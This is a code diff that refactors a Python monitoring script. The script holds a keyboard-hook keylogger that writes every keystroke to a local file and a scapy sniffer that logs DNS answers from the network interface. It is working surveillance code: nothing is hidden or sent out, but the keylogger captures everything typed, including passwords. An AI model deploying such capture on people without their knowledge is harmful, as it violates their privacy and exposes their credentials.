@@ -2,68 +2,72 @@ from utilities import current_time, user_name, active_interface
 import logging
 import keyboard
 import scapy.all as scapy
+import sys
 
-#key logger
+def setup_logger(log_filename, logger_name):
+    logger = logging.getLogger(logger_name)
+    logger.setLevel(logging.INFO)
+    handler = logging.FileHandler(log_filename, mode='a')
+    formatter = logging.Formatter('%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+    handler.setFormatter(formatter)
+    if not logger.hasHandlers():
+        logger.addHandler(handler)
+    return logger
+
 def key_logger():
-    print("Key Logger start and running.. \n ")
-    # Set up the logging configuration
-    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
-    # define a callback function to process the keystrokes
+    """
+    Starts the key logger and writes keystrokes to a uniquely named log file.
+    """
+    print("Key Logger started and running...\n")
+    log_filename = f"keylog-{user_name()}_{current_time()}.txt"
+    logger = setup_logger(log_filename, "KeyLogger")
+
     def on_key_press(event):
-        # get the name of the pressed key
         key = event.name
-        # write the keystroke to the log file
-        logging.info(key)
-    # hook the keyboard events with the callback function
+        logger.info(key)
+
     keyboard.on_press(on_key_press)
-    # start the hook and keep the script running
     try:
         keyboard.wait()
     except KeyboardInterrupt:
-        exit(0)
+        print("Key Logger stopped by user.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"Key Logger error: {e}")
+        sys.exit(1)
 
-
-#dns logger
 def dns_logger():
-    print("DNS Quary Logger start and running.. \n ")
-    # Set up the logging configuration
-    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
-    # Define a function to process each packet
-    def process_packet(packet):
-        # Check if the packet has a DNS layer and a DNS response
-        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
-            # Check if the packet has any answers in the DNS response
-            if packet[scapy.DNS].an is not None:
-                # Loop through each answer in the DNS response
-                for answer in packet[scapy.DNS].an:
-                    # Check if the answer is an A record
-                    if answer.type == 1:
-                        # Get the domain name and the IP address from the answer
-                        domain = answer.rrname.decode('utf-8')
-                        ip = answer.rdata
-                        # Log the domain name and the IP address
-                        logging.info(f'A record: {domain} -> {ip}')
-                    # Check if the answer is an AAAA record
-                    elif answer.type == 28:
-                        domain = answer.rrname.decode('utf-8')
-                        ip = answer.rdata
-                        logging.info(f'AAAA record: {domain} -> {ip}')
-                    # # Check if the answer is an CNAME record
-                    # elif answer.type == 5:
-                    #     cname = answer.rdata.decode('utf-8')
-                    #     logging.info(f'CNAME record: {domain} -> {cname}')
-                    # # Check if the answer is an MX record    
-                    # elif answer.type == 15:
-                    #     exchange = answer.exchange.decode('utf-8')
-                    #     preference = answer.preference
-                    #     logging.info(f'MX record: {domain} -> {exchange} with preference {preference}')
-                    # # Check if the answer is an NS record
-                    # elif answer.type == 2:
-                    #     ns = answer.rdata.decode('utf-8')
-                    #     logging.info(f'NS record: {domain} -> {ns}')
+    """
+    Starts the DNS logger and writes DNS queries to a uniquely named log file.
+    """
+    print("DNS Query Logger started and running...\n")
+    log_filename = f"dnslog-{user_name()}_{current_time()}.txt"
+    logger = setup_logger(log_filename, "DNSLogger")
 
-    # Sniff packets on the network interface and pass them to the process_packet function
+    def process_packet(packet):
+        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
+            if packet[scapy.DNS].an is not None:
+                answers = packet[scapy.DNS].an
+                if not isinstance(answers, list) and not hasattr(answers, '__iter__'):
+                    answers = [answers]
+                for answer in answers:
+                    try:
+                        domain = answer.rrname.decode('utf-8')
+                        if answer.type == 1:  # A record
+                            ip = answer.rdata
+                            logger.info(f'A record: {domain} -> {ip}')
+                        elif answer.type == 28:  # AAAA record
+                            ip = answer.rdata
+                            logger.info(f'AAAA record: {domain} -> {ip}')
+                    except Exception as e:
+                        logger.error(f"Error processing DNS answer: {e}")
+
     try:
-        scapy.sniff(iface=active_interface(), store=False, prn=process_packet)
+        iface = active_interface()
+        scapy.sniff(iface=iface, store=False, prn=process_packet)
     except KeyboardInterrupt:
-        exit(0)
+        print("DNS Logger stopped by user.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"DNS Logger error: {e}")
+        sys.exit(1)
